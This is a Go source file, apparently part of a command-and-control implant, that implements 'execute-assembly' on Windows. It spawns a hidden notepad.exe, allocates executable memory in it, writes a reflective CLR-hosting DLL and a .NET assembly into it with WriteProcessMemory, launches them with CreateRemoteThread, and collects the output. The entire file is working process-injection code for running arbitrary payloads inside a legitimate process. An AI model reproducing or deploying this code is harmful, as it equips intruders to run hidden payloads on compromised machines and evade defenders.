// +build windows

package executeassembly

import (
	"bytes"
	"errors"
	"fmt"
	"io"
	"log"
	"os/exec"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"pkg/utils/structs"
	"pkg/utils/winapi"
)

const (
	BobLoaderOffset     = 0x00000af0
	MAX_ASSEMBLY_LENGTH = 1025024
	STILL_ACTIVE        = 259
)

// ExecuteAssembly loads a .NET CLR hosting DLL inside a notepad.exe process
// along with a provided .NET assembly to execute.
func executeassembly(assembly *[]byte, params *string, job *structs.Job) (AssemblyOutput, error) {
	go job.MonitorStop()
	results := AssemblyOutput{}
	log.Println("[*] Assembly size:", len(*assembly))
	log.Println("[*] Hosting dll size:", len(loaderAssembly))
	log.Println("[*] Parameters:", *params)
	if *params == "" {
		*params = " "
	}
	if len(*assembly) > MAX_ASSEMBLY_LENGTH {
		return results, errors.New(fmt.Sprintf("Please use an assembly smaller than %d", MAX_ASSEMBLY_LENGTH))
	}
	cmd := exec.Command("notepad.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true,
	}
	var stdoutBuf, stderrBuf bytes.Buffer
	stdoutIn, _ := cmd.StdoutPipe()
	stderrIn, _ := cmd.StderrPipe()

	var errStdout, errStderr error
	cmd.Start()
	pid := cmd.Process.Pid
	// OpenProcess with PROC_ACCESS_ALL
	handle, err := syscall.OpenProcess(winapi.PROCESS_ALL_ACCESS, true, uint32(pid))
	if err != nil {
		return results, err
	}
	// VirtualAllocEx to allocate a new memory segment into the target process
	loaderAssemblyAddr, err := winapi.VirtualAllocEx(handle, 0, uint32(len(loaderAssembly)), winapi.MEM_COMMIT|winapi.MEM_RESERVE, syscall.PAGE_EXECUTE_READWRITE)
	if err != nil {
		return results, err
	}
	// WriteProcessMemory to write the reflective loader into the process
	_, err = winapi.WriteProcessMemory(handle, loaderAssemblyAddr, unsafe.Pointer(&loaderAssembly[0]), uint32(len(loaderAssembly)))
	if err != nil {
		return results, err
	}
	log.Printf("[*] Hosting DLL reflectively injected at 0x%08x\n", loaderAssemblyAddr)
	// Total size to allocate = assembly size + 1024 bytes for the args
	totalSize := uint32(MAX_ASSEMBLY_LENGTH)
	// VirtualAllocEx to allocate another memory segment for hosting the .NET assembly and args
	assemblyAddr, err := winapi.VirtualAllocEx(handle, 0, totalSize, winapi.MEM_COMMIT|winapi.MEM_RESERVE, syscall.PAGE_READWRITE)
	if err != nil {
		return results, err
	}
	// Pad arguments with 0x00 -- there must be a cleaner way to do that
	paramsBytes := []byte(*params)
	padding := make([]byte, 1024-len(*params))
	final := append(paramsBytes, padding...)
	// Final payload: params + assembly
	final = append(final, *assembly...)
	// WriteProcessMemory to write the .NET assembly + args
	_, err = winapi.WriteProcessMemory(handle, assemblyAddr, unsafe.Pointer(&final[0]), uint32(len(final)))
	if err != nil {
		return results, err
	}
	log.Printf("[*] Wrote %d bytes at 0x%08x\n", len(final), assemblyAddr)
	// CreateRemoteThread(DLL addr + offset, assembly addr)
	// attr := new(syscall.SecurityAttributes)
	threadHandle, err := winapi.CreateRemoteThread(handle, zeroPtr, 0, uintptr(loaderAssemblyAddr+BobLoaderOffset), uintptr(assemblyAddr), 0, zeroPtr)
	if err != nil {
		return results, err
	}
	log.Printf("Got thread handle: 0x%08x\n", threadHandle)
	for {
		if *job.Stop > 0 {
			// log.Println("From main EXE loop we see kill message")
			// Init kill sequence
			break
		}
		code, err := winapi.GetExitCodeThread(threadHandle)
		if err != nil && !strings.Contains(err.Error(), "operation completed successfully") {
			log.Fatalln(err.Error())
		}
		if code == STILL_ACTIVE {
		    log.Println("still active")
			time.Sleep(time.Second)
		} else {
			break
		}
	}
	cmd.Process.Kill()
	// if *kill > 0 {
	// 	return results, errors.New("Job killed.")
	// }
	go func() {
		_, errStdout = io.Copy(&stdoutBuf, stdoutIn)
	}()
	_, errStderr = io.Copy(&stderrBuf, stderrIn)

	if errStdout != nil || errStderr != nil {
		return results, errors.New(fmt.Sprintf("Failed to capture stdout or stderr\n"))
	}
	outStr, errStr := string(stdoutBuf.Bytes()), string(stderrBuf.Bytes())
	fmt.Printf("\nout:\n%s\nerr:\n%s\n", outStr, errStr)
	results.StdOut = outStr
	results.StdErr = errStr
	return results, nil
}
